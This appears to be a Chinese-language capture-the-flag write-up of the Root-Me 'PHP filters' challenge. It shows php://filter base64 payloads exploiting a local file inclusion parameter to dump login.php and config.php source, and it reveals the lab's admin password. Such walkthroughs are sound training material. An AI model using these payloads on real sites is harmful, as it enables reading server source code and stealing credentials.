## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[PHP filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-filters)] [[解题报告](http://exp-blog.com/2019/03/05/pid-3450/)]

------

PHP 的 LFI 漏洞，前置知识可以参考这篇文章： 【[Local File Inclusion (LFI) — Web Application Penetration Testing](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)】

------------


开启挑战后注意到：

- 点击 home 后，URL 会添加参数 `?inc=accueil.php`
- 点击 login 后，URL 会添加参数 `?inc=login.php`

![](http://exp-blog.com/wp-content/uploads/2019/03/6e33ef1692d033405ebe3b484be94747.png)
![](http://exp-blog.com/wp-content/uploads/2019/03/a4262a891c35a88530b0b53e24e3e19a.png)

这已经满足了 LFI 漏洞的特征。

而题目提示是 【PHP filters】，而在 LFI 漏洞利用中， `php://filter` 的主要作用是查看服务器的本地文件内容。

参考 payload 为 `vuln.php?page=php://filter/convert.base64-encode/resource=filepath` ，

意思为使用 base64 编码方式查看指定路径的文件内容。


------------

而目前为止，我们知道的两个文件为 `accueil.php` 和 `login.php` ，因此我们先后构造两个 payload 如下：

- `?inc=php://filter/convert.base64-encode/resource=accueil.php`
- `?inc=php://filter/convert.base64-encode/resource=login.php`

对于第一个 payload 没有得到有价值的内容，而第二个 payload 返回 base64 编码后的 login.php 页面源码：

```
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
```

![](http://exp-blog.com/wp-content/uploads/2019/03/28daa024a2bddd6e80cf03f6a8860496.png)

对其进行 Base64 解码，得到 login.php 的页面源码为：

```php
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login <br/>
  <input type="text" name="username" /><br/><br/>
  Password <br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

其中源码第一行 `include("config.php");` 包含了一个配置文件 config.php ，而之后则有一个条件语句：

`if ($_POST["username"]==$username && $_POST["password"]==$password)`

很明显是比较输入的账密与变量 `$username`/`$password` 是否一致，但是没看到这两个变量定义在哪里。

初步推测这两个变量是定义在第一行包含的配置文件 config.php 中。


------------

为此，构造第三个 payload 查看 config.php 的内容：

`?inc=php://filter/convert.base64-encode/resource=config.php`

![](http://exp-blog.com/wp-content/uploads/2019/03/f0c02d13a4fad9b3f06b849cf041c592.png)

得到 config.php 的 Base64 编码内容为：

`PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==`

解码后得到密码，完成挑战：

```php
<?php

$username="admin";
$password="DAPt9D2mky0APAF";

?>
```

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
